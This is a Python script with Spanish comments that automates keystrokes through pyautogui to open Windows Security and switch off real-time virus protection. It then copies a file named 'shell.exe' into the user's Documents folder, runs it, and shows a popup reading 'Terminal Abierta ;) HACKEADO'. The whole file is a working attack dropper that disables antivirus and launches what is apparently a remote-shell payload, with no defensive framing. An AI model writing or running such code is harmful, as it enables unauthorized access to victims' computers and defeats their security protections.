import pyautogui
import time
import os
import shutil
import subprocess
import tkinter as tk
from tkinter import messagebox

# Espera un momento antes de comenzar
time.sleep(2)

# Simula la pulsación de Ctrl + Esc para abrir el menú de búsqueda
pyautogui.hotkey('ctrl', 'esc')

# Espera un momento para que se abra el menú
time.sleep(2)

# Escribe "protección contra virus y amenazas"
pyautogui.typewrite("protecc", interval=0.1)

# Presiona Enter para abrir la configuración
pyautogui.press('enter')

# Espera un momento para que cargue la configuración
time.sleep(3)

# Simula la pulsación de Tab cuatro veces
pyautogui.press('tab', presses=4)

# Espera un momento
time.sleep(2)

# Presiona Enter
pyautogui.press('enter')

# Espera un momento
time.sleep(3)

# Presiona Espacio
pyautogui.press('space')

# Espera un momento para que aparezca el panel de confirmación
time.sleep(2)

pyautogui.press('tab',presses=3)

time.sleep(2)

pyautogui.press('space')

time.sleep(2)

pyautogui.press('tab')

time.sleep(2)

pyautogui.press('space')

time.sleep(2)

pyautogui.press('tab',presses=2)

time.sleep(2)

pyautogui.press('space')

time.sleep(2)

# Simula la pulsación de Alt + F4 para cerrar la ventana activa
pyautogui.hotkey('alt', 'f4')

time.sleep(1)


# Nombre del archivo a copiar
file_name = 'shell.exe'

# Ruta del archivo original (en la misma carpeta que el script)
source_path = os.path.join(os.getcwd(), file_name)

# Obtiene la ruta de la carpeta Documentos del usuario
documents_path = os.path.join(os.path.expanduser("~"), "Documents")

# Ruta de destino donde se copiará el archivo
destination_path = os.path.join(documents_path, file_name)

# Copia el archivo a la carpeta Documentos
shutil.copy(source_path, destination_path)

time.sleep(3)

# Ejecuta el archivo copiado
subprocess.run([destination_path])



def mostrar_alerta():
    root = tk.Tk()
    root.title("Alerta")
    root.geometry("400x100")
    
    label = tk.Label(root, text="Terminal Abierta ;) HACKEADO", font=("Arial", 12))
    label.pack(pady=20)

    # Configura la ventana para que se cierre después de 5 segundos (5000 ms)
    root.after(5000, root.destroy)

    root.mainloop()

mostrar_alerta()








